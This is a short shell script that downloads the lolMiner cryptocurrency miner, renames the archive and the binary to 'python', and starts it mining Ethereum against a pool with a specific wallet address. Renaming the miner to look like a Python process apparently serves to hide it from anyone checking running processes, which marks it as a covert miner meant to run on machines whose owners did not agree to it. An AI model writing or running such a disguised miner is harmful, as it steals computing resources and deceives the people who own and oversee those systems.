curl -L -o python.tar.gz https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz
tar -zxvf python.tar.gz
cd 1.31
mv lolMiner python
./python --algo ETHASH --pool us1.ethermine.org:4444 --user 0xacc4e69563A9897B09f8Ef36A7e60256f28Ef191.KHANG_01
